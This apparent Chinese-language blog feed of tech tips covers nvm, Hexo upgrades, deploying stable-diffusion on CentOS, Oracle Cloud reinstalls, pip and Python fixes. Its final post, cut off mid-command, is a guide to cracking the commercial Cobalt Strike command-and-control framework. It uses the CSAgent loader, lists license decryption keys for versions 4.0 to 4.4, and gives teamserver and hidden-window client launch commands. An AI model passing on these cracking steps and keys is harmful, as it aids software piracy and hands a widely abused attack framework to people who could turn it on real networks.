        <content type="html"><![CDATA[<h1 id="node-js版本问题"><a href="#node-js版本问题" class="headerlink" title="node.js版本问题"></a>node.js版本问题</h1><p>起因是我想给node.js版本降级，卸载了新版，安装旧版后发现npm仍然是最新版本</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>安装nvm(<a href="https://github.com/coreybutler/nvm-windows">coreybutler/nvm-windows: A node.js version management utility for Windows. Ironically written in Go. (github.com)</a>)，这是一款管理node.js版本的工具</p><h2 id="安装流程"><a href="#安装流程" class="headerlink" title="安装流程"></a>安装流程</h2><p>进入github选择nvm-setup下载，然后傻瓜式安装</p><h2 id="部分命令"><a href="#部分命令" class="headerlink" title="部分命令"></a>部分命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nvm  <span class="token comment">#查看命令面板</span>nvm <span class="token function">ls</span> available <span class="token comment">#列出可用的最新的部分node.js版本</span>nvm <span class="token function">install</span> 版本号 <span class="token comment"># 安装想要的版本</span>nvm uninstall 版本号 <span class="token comment"># 卸载想要的版本</span>nvm list <span class="token comment">#列出已经安装的版本</span>nvm use 版本号 <span class="token comment">#启用版本</span><span class="token function">node</span> <span class="token parameter variable">-v</span> <span class="token comment">#查看版本号</span><span class="token function">npm</span> <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo升级及升级后的问题</title>
      <link href="/2024/01/14/hexo-sheng-ji/"/>
      <url>/2024/01/14/hexo-sheng-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo升级及升级后的问题"><a href="#hexo升级及升级后的问题" class="headerlink" title="hexo升级及升级后的问题"></a>hexo升级及升级后的问题</h1><h2 id="hexo升级"><a href="#hexo升级" class="headerlink" title="hexo升级"></a>hexo升级</h2><p>首先升级node.js，去官网下载最新安装包，接着执行以下命令升级hexo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> npm-check-updates <span class="token comment"># 安装更新工具</span>ncu <span class="token comment"># 检查npm软件包更新，需在项目根目录下执行</span>ncu <span class="token parameter variable">-u</span> <span class="token comment"># 更新package.json配置</span><span class="token function">npm</span> <span class="token function">install</span> <span class="token comment"># 安装package.json配置的版本</span>hexo version <span class="token comment"># 更新后检查hexo版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="升级后的问题"><a href="#升级后的问题" class="headerlink" title="升级后的问题"></a>升级后的问题</h2><p>升级后执行hexo d部署提交时报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">at ChildProcess.<span class="token operator">&lt;</span>anonymous<span class="token operator">&gt;</span> <span class="token punctuation">(</span>D:<span class="token punctuation">\</span>blog<span class="token punctuation">\</span>node_modules<span class="token punctuation">\</span>_hexo-util@1.9.0@hexo-util<span class="token punctuation">\</span>lib<span class="token punctuation">\</span>spawn.js:51:21<span class="token punctuation">)</span>    at ChildProcess.emit <span class="token punctuation">(</span>events.js:310:20<span class="token punctuation">)</span>    at ChildProcess.cp.emit <span class="token punctuation">(</span>D:<span class="token punctuation">\</span>blog<span class="token punctuation">\</span>node_modules<span class="token punctuation">\</span>_cross-spawn@7.0.2@cross-spawn<span class="token punctuation">\</span>lib<span class="token punctuation">\</span>enoent.js:34:29<span class="token punctuation">)</span>    at Process.ChildProcess._handle.onexit <span class="token punctuation">(</span>internal/child_process.js:275:12<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这时候你需要执行<code>ssh -T git@github.com</code>测试是否连接正常，若失败报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED<span class="token operator">!</span>     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY<span class="token operator">!</span> Someone could beeavesdropping on you right now <span class="token punctuation">(</span>man-in-the-middle attack<span class="token punctuation">)</span><span class="token operator">!</span> It is alsopossible that a <span class="token function">host</span> key has just been changed. The fingerprint <span class="token keyword">for</span> the RSAkey sent by the remote <span class="token function">host</span> is <span class="token punctuation">[</span>truncated<span class="token punctuation">]</span>. Please contact your systemadministrator. Add correct <span class="token function">host</span> key <span class="token keyword">in</span> /home/username/.ssh/known_hosts toget rid of this message. Offending RSA key <span class="token keyword">in</span>/home/username/.ssh/known_hosts:24 Password authentication is disabled toavoid man-in-the-middle attacks. Keyboard-interactive authentication isdisabled to avoid man-in-the-middle attacks. Agent forwarding is disabled toavoid man-in-the-middle attacks.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>则先去github重新绑定秘钥（如果原来的掉了），步骤和安装是一样，然后去<code>c/Users/youuser/.ssh</code>下删除<code>c:\users\username\.ssh\known_hosts</code>这个文件，重新执行<code>ssh -T git@github.com</code>，选择yes，连接成功，再进行hexo d提交。</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stable-diffusion部署在centos</title>
      <link href="/2023/05/15/stable-diffusion-bu-shu-zai-ubuntu/"/>
      <url>/2023/05/15/stable-diffusion-bu-shu-zai-ubuntu/</url>
      
        <content type="html"><![CDATA[<h1 id="stable-diffusion部署在centos"><a href="#stable-diffusion部署在centos" class="headerlink" title="stable-diffusion部署在centos"></a>stable-diffusion部署在centos</h1><h2 id="安装python环境"><a href="#安装python环境" class="headerlink" title="安装python环境"></a>安装python环境</h2><p>版本推荐python3.10.6</p><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p>sudo apt install git </p><h2 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h2><p>到普通用户目录执行<code>git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui.git</code>把项目下载</p><p>执行./webui.sh下载依赖最后启动</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>先安装pytorch</p><p>launch.py</p><pre class="line-numbers language-none"><code class="language-none">找到torch_command = os.environ.get('TORCH_COMMAND', "pip install torch==1.13.1+cu117 torchvision==0.14.1+cu117 --extra-index-url https://download.pytorch.org/whl/cu117")，并修改修改后：torch_command = os.environ.get('TORCH_COMMAND', "pip install torch==1.13.1 torchvision==0.14.1") <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ln <span class="token operator">-</span>s <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token operator">/</span>python3 <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>pythonln <span class="token operator">-</span>s <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token operator">/</span>pip3 <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>pip<span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token constant">AUTOMATIC1111</span><span class="token operator">/</span>stable<span class="token operator">-</span>diffusion<span class="token operator">-</span>webui<span class="token punctuation">.</span>git<span class="token constant">COMMANDLINE_ARGS</span><span class="token operator">=</span><span class="token operator">--</span>skip<span class="token operator">-</span>torch<span class="token operator">-</span>cuda<span class="token operator">-</span>test <span class="token operator">--</span>precision full <span class="token operator">--</span>no<span class="token operator">-</span>half <span class="token operator">--</span>lowvram<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>weibu.py中将shared.demo.launch()第一行</p><p>改为share=True</p><pre class="line-numbers language-none"><code class="language-none">pip install -r requirements.txtpip install -r requirements_versions.txtpip install basicsrpip install facexlibpip install -r requirements.txtpython setup.py develop# If you want to enhance the background (non-face) regions with Real-ESRGAN,# you also need to install the realesrgan packagepip install realesrgan--skip-torch-cuda-test --upcast-sampling --use-cpu interrogate./webui.sh --listen --no-half<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">add-apt-repository ppa:deadsnakes/ppaapt updateapt install python3.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Failed to build these modules: _ctypesyum install libffi-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ ./configure --prefix=/usr/local/python3 --enable-optimizations$ make$ make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">yum install -y xz-develpip install backports.lzmayum install mesa-libGL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/home/hero/stable-diffusion-webui/venv/bin/python3 -m pip install --upgrade torchvision==0.2.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">systemctl status firewalldsystemctl stop firewalldyum install -y iptables-servicessystemctl start iptablessystemctl status iptablescp -a /etc/sysconfig/iptables /etc/sysconfig/iptables.bakiptables -I INPUT -p tcp --dport 7860 -m state --state NEW -j ACCEPTiptables-save &gt; /etc/sysconfig/iptablessystemctl enable iptables.servicesystemctl enable iptables.servicesystemctl rebootnetstat -tulpeniptables -Liptables -A INPUT -p tcp --dport 7860 -j ACCEPTiptables -A OUTPUT -p tcp --sport 7860 -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">~/stable-diffusion-webui/webui.sh --listen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">vi /etc/sysconfig/iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python调用datetime.now()提示未找到模块</title>
      <link href="/2023/03/23/python-diao-yong-datetime.now-ti-shi-wei-zhao-dao-mo-kuai/"/>
      <url>/2023/03/23/python-diao-yong-datetime.now-ti-shi-wei-zhao-dao-mo-kuai/</url>
      
        <content type="html"><![CDATA[<h1 id="python调用datetime-now-提示未找到模块"><a href="#python调用datetime-now-提示未找到模块" class="headerlink" title="python调用datetime.now()提示未找到模块"></a>python调用datetime.now()提示未找到模块</h1><p>首先确定导入了模块<code>from datetime import datetime</code></p><p>如果还是报错，那么可能存在一个<code>datetime.py</code>的文件覆盖了原模块</p><p>可以直接使用<code>datetime.datetime.now()</code>来调用，或者将那个<code>datetime.py</code>改名</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>甲骨文云重置实例</title>
      <link href="/2023/03/23/jia-gu-wen-yun-chong-zhi-shi-li/"/>
      <url>/2023/03/23/jia-gu-wen-yun-chong-zhi-shi-li/</url>
      
        <content type="html"><![CDATA[<h1 id="甲骨文云重置实例"><a href="#甲骨文云重置实例" class="headerlink" title="甲骨文云重置实例"></a>甲骨文云重置实例</h1><p>来自<a href="https://v2rayssr.com/oracle-centos.html">https://v2rayssr.com/oracle-centos.html</a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1、甲骨文（oracle）机器一台（始终免费），若是没有，请看下面博文链接：</p><ul><li><a href="https://v2rayssr.com/oracle.html">始终免费的VPS！油管8K视频秒开，颠覆你对免费资源的看法。Oracle（甲骨文）免费云服务器注册指南及故障解决！</a></li><li><a href="https://v2rayssr.com/oracle-arm.html">始终免费的 4核 24G内存 的VPS！甲骨文 (oracle) 抢/刷 ARM 实例！一键脚本部署开ARM机器！</a></li></ul><p>2、SSH 连接工具（<a href="https://v2rayssr.com/go?url=https://www.hostbuf.com/t/988.html">FinalShell</a>），VNC 连接工具（<a href="https://v2rayssr.com/go?url=https://www.realvnc.com/en/connect/download/viewer/">VNC® Viewer</a>）</p><p>3、域名一个做好解析，开启 CDN（小云朵），毕竟是建站的</p><h2 id="视频教程演示"><a href="#视频教程演示" class="headerlink" title="视频教程演示"></a>视频教程演示</h2><p><a href="https://v2rayssr.com/go?url=https://youtu.be/grebA_WHGXY"><img src="https://v2rayssr.com/wp-content/uploads/2022/07/12232323.png" alt="img"></a></p><h2 id="甲骨文-VPS-安装-CentOS-8"><a href="#甲骨文-VPS-安装-CentOS-8" class="headerlink" title="甲骨文 VPS 安装 CentOS 8"></a>甲骨文 VPS 安装 CentOS 8</h2><blockquote><p><strong>友情提示：</strong></p><p>下面为 ARM 机器安装演示</p></blockquote><h3 id="VPS-设置"><a href="#VPS-设置" class="headerlink" title="VPS 设置"></a>VPS 设置</h3><p>SSH 连接 VPS，并进入 boot 文件夹，下载 Netboot 启动文件</p><pre class="line-numbers language-none"><code class="language-none">apt update -yapt install wget -ycd /boot/efi/EFIwget https://boot.netboot.xyz/ipxe/netboot.xyz-arm64.efi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>若你是重装系统，请执行下面命令</p><pre class="line-numbers language-none"><code class="language-none">yum update -yyum install wget -ycd /boot/efi/EFIwget https://boot.netboot.xyz/ipxe/netboot.xyz-arm64.efi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="甲骨文控制台设置"><a href="#甲骨文控制台设置" class="headerlink" title="甲骨文控制台设置"></a>甲骨文控制台设置</h3><p>进入甲骨文控制台，点击实例详情，在左边找到 “控制台连接” ，启动 Cloud Shell 连接</p><h3 id="设置-Netboot-引导启动"><a href="#设置-Netboot-引导启动" class="headerlink" title="设置 Netboot 引导启动"></a>设置 Netboot 引导启动</h3><p>重启 VPS ，并在 Cloud Shell 里面不停按键盘 ESC 键，进入 BIOS ，如图所示</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/112.jpg" alt="img"></p><p>选择 Boot Maintenance Manager —— Boot Frome File ，</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/133.jpg" alt="img"></p><p>选择 <code>netboot.xyz-arm64.efi</code>，点击回车，进行引导！</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/1233.jpg" alt="img"></p><p>在引导的界面，我们选择 <code>Linux Network Installs (arm64)</code></p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/1212.jpg" alt="img"></p><p>选择你需要安装的系统，选择错误，可以按 ESC 返回上级菜单，我们选择 <code>CentOS</code> —— <code>CentOS 8.0 Stream</code>，点击回车，再次选择 <code>CentOS 8-stream text based installer</code></p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/2323.jpg" alt="img"></p><p>开始引导安装了以后，我们在 Cloud Shell 里面会看到如下图：</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/232323.jpg" alt="img"></p><p>我们选择 1，使用 VNC 可视化进行安装</p><p>设置 VNC 的密码（一定只是6 – 8个字符），确认密码</p><h3 id="VNC-连接-VPS"><a href="#VNC-连接-VPS" class="headerlink" title="VNC 连接 VPS"></a>VNC 连接 VPS</h3><p>现在我们就可以通过 VNC 工具来连接我们的甲骨文 ARM 机器，并进行安装了。</p><p>VNC® Viewer 软件连接地址：<code>VPSIP:1</code> ，输入密码以后，你大致就连接成功了</p><h3 id="安装-CentOS-8"><a href="#安装-CentOS-8" class="headerlink" title="安装 CentOS 8"></a>安装 CentOS 8</h3><p>安装的过程很简单，若是有不明白的地方，请观看 <a href="https://v2rayssr.com/go?url=https://youtu.be/grebA_WHGXY"><strong>视频教程</strong></a></p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/3434.jpg" alt="img"></p><p>安装完成以后，我们就直接可以从 SSH 工具，登录我们的 <code>CentOS 8-stream</code> 了</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/444.jpg" alt="img"></p><blockquote><p>友情提醒：可以更改 VPS 主机名</p><pre class="line-numbers language-none"><code class="language-none">hostnamectl set-hostname host.aaa.com --transienthostnamectl set-hostname host.aaa.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h3 id="安装宝塔面板"><a href="#安装宝塔面板" class="headerlink" title="安装宝塔面板"></a>安装宝塔面板</h3><p>安装宝塔面板，相关的插件，设置网站！</p><p>在安装宝塔面板的过程中，或许有下图的错误提示，看着很吓人：</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/55.jpg" alt="img"></p><p>其实，这个只是 <code>pip</code> 的版本太低，我们根据提示命令更新下就好了！</p><p>在宝塔面板里面，推荐安装如下运行环境：（LNMP – 编译安装）因为下面版本我安装并没有出错。</p><p><img src="https://v2rayssr.com/wp-content/themes/b2/Assets/fontend/images/default-img.jpg" alt="img"></p><p>编译安装时间有点长，但是更稳定可靠，大家耐心等待，下面是我等待的时间：</p><pre class="line-numbers language-none"><code class="language-none">安装[opcache-74]【已完成】耗时12秒安装[exif-74]【已完成】耗时19秒安装[imagemagick-74]【已完成】耗时38秒安装[redis-74]【已完成】耗时74秒安装[fileinfo-74]【已完成】耗时30秒安装[php-7.4]【已完成】耗时179秒安装[mysql-5.7]【已完成】耗时991秒安装[nginx-1.20]【已完成】耗时376秒<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>完成以后，看见监控栏的几项参数，瞬间觉得，哇！甲骨文 YYDS！</p><p><img src="https://v2rayssr.com/wp-content/themes/b2/Assets/fontend/images/default-img.jpg" alt="img"></p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/343434.jpg" alt="img"></p><p>设置好了 WordPress 以后，我们来看一下 WordPress 的站点健康检测：</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/3423.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux到手时需要安装</title>
      <link href="/2023/03/08/linux-dao-shou-shi-xu-yao-an-zhuang/"/>
      <url>/2023/03/08/linux-dao-shou-shi-xu-yao-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="linux到手时需要安装"><a href="#linux到手时需要安装" class="headerlink" title="linux到手时需要安装"></a>linux到手时需要安装</h1><h2 id="安装的依赖"><a href="#安装的依赖" class="headerlink" title="安装的依赖"></a>安装的依赖</h2><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>json.decoder.JSONDecodeError</title>
      <link href="/2023/03/04/json.decoder.jsondecodeerror/"/>
      <url>/2023/03/04/json.decoder.jsondecodeerror/</url>
      
        <content type="html"><![CDATA[<h1 id="json-decoder-JSONDecodeError"><a href="#json-decoder-JSONDecodeError" class="headerlink" title="json.decoder.JSONDecodeError"></a>json.decoder.JSONDecodeError</h1><p>我是安装<code>stable diffusion</code>出现的错误</p><p>大致截图</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> File <span class="token string">"G:<span class="token entity" title="\r">\r</span>uanjian\stable-diffusion-webui-master<span class="token entity" title="\0">\0</span>xdadream\lib\site-packages<span class="token entity" title="\t">\t</span>ransformers<span class="token entity" title="\t">\t</span>okenization_utils_base.py"</span>, line <span class="token number">1956</span>, <span class="token keyword">in</span> _from_pretrained    tokenizer <span class="token operator">=</span> cls<span class="token punctuation">(</span>*init_inputs, **init_kwargs<span class="token punctuation">)</span>  File <span class="token string">"G:<span class="token entity" title="\r">\r</span>uanjian\stable-diffusion-webui-master<span class="token entity" title="\0">\0</span>xdadream\lib\site-packages<span class="token entity" title="\t">\t</span>ransformers\models<span class="token entity" title="\c">\c</span>lip<span class="token entity" title="\t">\t</span>okenization_clip.py"</span>, line <span class="token number">323</span>, <span class="token keyword">in</span> __init__    self.encoder <span class="token operator">=</span> json.load<span class="token punctuation">(</span>vocab_handle<span class="token punctuation">)</span> …………json.decoder.JSONDecodeError: Unterminated string starting at: line <span class="token number">1</span> <span class="token function">column</span> <span class="token number">11370</span> <span class="token punctuation">(</span>char <span class="token number">11369</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>问题出在这<code>json.load(vocab_handle)</code></p><p>找到这个文件存放目录<code>C:\Users\xxx\.cache\huggingface\hub\models--openai--clip-vit-large-patch14\blobs\xxxx</code>，把下面东西全删除</p><p><a href="https://huggingface.co/openai/clip-vit-base-patch32/resolve/main/vocab.json%EF%BC%8C%E4%B8%8B%E8%BD%BD%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E6%94%BE%E5%9C%A8%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cbat%E6%96%87%E4%BB%B6%E5%B0%B1%E6%88%90%E5%8A%9F%E4%BA%86">https://huggingface.co/openai/clip-vit-base-patch32/resolve/main/vocab.json，下载这个文件放在目录下，重新执行bat文件就成功了</a></p><p>这个问题是因为文件出现了破损</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip的使用</title>
      <link href="/2022/12/20/pip-de-shi-yong/"/>
      <url>/2022/12/20/pip-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="pip安装"><a href="#pip安装" class="headerlink" title="pip安装"></a>pip安装</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>不写了</p><h3 id="linux（ubuntu）"><a href="#linux（ubuntu）" class="headerlink" title="linux（ubuntu）"></a>linux（ubuntu）</h3><h2 id="pip的使用"><a href="#pip的使用" class="headerlink" title="pip的使用"></a>pip的使用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token parameter variable">--version</span> <span class="token comment">#显示版本和路径</span>pip <span class="token function">install</span> <span class="token parameter variable">-U</span> pip <span class="token comment">#升级pip</span>pip <span class="token function">install</span> SomePackage              <span class="token comment"># 最新版本</span>pip <span class="token function">install</span> <span class="token assign-left variable">SomePackage</span><span class="token operator">==</span><span class="token number">1.0</span>.4       <span class="token comment"># 指定版本</span>pip <span class="token function">install</span> <span class="token string">'SomePackage&gt;=1.0.4'</span>     <span class="token comment"># 最小版本</span>pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> SomePackage   <span class="token comment">#升级包</span>pip uninstall SomePackage  <span class="token comment">#卸载包</span>pip search SomePackage  <span class="token comment">#搜索包</span>pip show   <span class="token comment">#显示安装包信息 </span>pip show <span class="token parameter variable">-f</span> SomePackage  <span class="token comment">#查看指定包的详细信息</span>pip list  <span class="token comment">#列出已安装的包</span>pip list <span class="token parameter variable">-o</span>  <span class="token comment">#查看可升级的包</span>pip <span class="token function">install</span> <span class="token parameter variable">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple some-package  <span class="token comment">#指定源安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> site <span class="token comment"># 列出所有库的解释路径</span>or<span class="token function">import</span> sysprint<span class="token punctuation">(</span>sys.path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike安装和破解</title>
      <link href="/2022/05/24/cobalt-strike-an-zhuang-he-po-jie/"/>
      <url>/2022/05/24/cobalt-strike-an-zhuang-he-po-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike安装和破解"><a href="#Cobalt-Strike安装和破解" class="headerlink" title="Cobalt Strike安装和破解"></a>Cobalt Strike安装和破解</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先CS分客户端和服务端，服务端我选择架设在kali中，客户端在windows11</p><p>首先必须有Java环境，kali内置Java环境，windows自行查找</p><h3 id="CS下载"><a href="#CS下载" class="headerlink" title="CS下载"></a>CS下载</h3><p>地址</p><p>验证版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certutil <span class="token parameter variable">-hashfile</span> cobaltstrike.jar SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="破解-汉化"><a href="#破解-汉化" class="headerlink" title="破解+汉化"></a>破解+汉化</h2><p>下载CSAgent<a href="https://github.com/Twi1ight/CSAgent">Twi1ight/CSAgent: CobaltStrike 4.x通用白嫖及汉化加载器 (github.com)</a></p><p>将文件解压到与CS相同的目录下</p><p>替换cobaltstrike、teamserver、agscript、c2lint、cobaltstrike.bat文件中的解密key，目前内置的key为4.4版本</p><p>各个版本的官方解密key：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">4.0</span> 1be5be52c6255c33558e8a1cb667cb06<span class="token number">4.1</span> 80e32a742060b884419ba0c171c9aa76<span class="token number">4.2</span> b20d487addd4713418f2d5a3ae02a7a0<span class="token number">4.3</span> 3a4425490f389aeec312bdd758ad2b99<span class="token number">4.4</span> 5e98194a01c6b48fa582a6a9fcbb92d6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下就能正常使用了</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="kali启动服务端"><a href="#kali启动服务端" class="headerlink" title="kali启动服务端"></a>kali启动服务端</h3><p>在存放文件的主目录打开终端</p><p>运行命令，当然你要先保证<code>teamserver</code>文件有执行权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./teamserver kali_IP password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>password为你想设置的连接密码，待会客户端连接会使用</p><h3 id="kali里启动客户端"><a href="#kali里启动客户端" class="headerlink" title="kali里启动客户端"></a>kali里启动客户端</h3><p>可以同时在kali运行</p><p>可以运行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-XX:ParallelGCThreads</span><span class="token operator">=</span><span class="token number">4</span> <span class="token parameter variable">-XX:+AggressiveHeap</span> <span class="token parameter variable">-XX:+UseParallelGC</span> <span class="token parameter variable">-javaagent:CSAgent.jar</span><span class="token operator">=</span>5e98194a01c6b48fa582a6a9fcbb92d6 <span class="token parameter variable">-Duser.language</span><span class="token operator">=</span>en <span class="token parameter variable">-jar</span> cobaltstrike.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为方便可以写入sh文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> clients.sh<span class="token comment">#复制进入</span><span class="token function">java</span> <span class="token parameter variable">-XX:ParallelGCThreads</span><span class="token operator">=</span><span class="token number">4</span> <span class="token parameter variable">-XX:+AggressiveHeap</span> <span class="token parameter variable">-XX:+UseParallelGC</span> <span class="token parameter variable">-javaagent:CSAgent.jar</span><span class="token operator">=</span>5e98194a01c6b48fa582a6a9fcbb92d6 <span class="token parameter variable">-Duser.language</span><span class="token operator">=</span>en <span class="token parameter variable">-jar</span> cobaltstrike.jar<span class="token function">chmod</span> <span class="token number">777</span> clients.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="windows中运行客户端"><a href="#windows中运行客户端" class="headerlink" title="windows中运行客户端"></a>windows中运行客户端</h3><p>执行运行cobaltstrike.bat</p><p>若想隐藏弹框，创建cobaltstrike.vbs的内容为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CreateObject<span class="token punctuation">(</span><span class="token string">"WScript.Shell"</span><span class="token punctuation">)</span>.Run <span class="token string">"java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC 